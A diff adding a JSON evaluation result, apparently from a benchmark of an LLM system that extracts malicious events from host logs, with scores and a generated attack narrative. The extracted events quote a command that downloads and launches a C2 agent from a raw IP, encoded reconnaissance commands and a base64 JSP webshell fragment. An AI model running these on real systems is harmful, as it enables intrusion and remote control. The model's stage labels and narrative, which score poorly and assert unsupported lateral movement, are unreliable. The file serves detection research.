@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "rm -f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.jsp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "/usr/bin/install -d -o man -g man -m 0755 /var/cache/man",
+        "stage": "Collection"
+      },
+      {
+        "command": "find /var/cache/man -type f -name *.gz -atime +6 -delete",
+        "stage": "Collection"
+      },
+      {
+        "command": "fwupdmgr refresh --no-metadata-check",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "A sophisticated threat actor initiated an initial access via multiple vectors including a potential webshell upload and exploitation of vulnerabilities within a remote service management framework. Following successful execution, they established persistence through modifications to system configuration files. The adversary also employed various defense evasion techniques such as code obfuscation, anti-debugging, and sandbox evasion to maintain their foothold while evading detection. They utilized existing tools like `ssh` and `cron` jobs to perform lateral movement across the environment. To compromise sensitive data, they leveraged credentials obtained during credential access attacks. Moreover, they conducted discovery operations using processes like `/usr/bin/env -i` and `bash`. Throughout the campaign, the attacker made numerous attempts to collect valuable information, clean up logs, and establish collection points for further analysis.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 79977,
+      "completion_tokens": 1744,
+      "total_tokens": 81721,
+      "wall_clock_s": 22.873,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3,
+      "recall": 0.42857142857142855,
+      "f1": 0.3529411764705882,
+      "tp": 3,
+      "fp": 7,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 10,
+      "fn": 7,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 79977,
+      "completion_tokens": 1744,
+      "total_tokens": 81721,
+      "wall_clock_s": 22.873,
+      "parse_retries": 0
+    }
+  }
+}
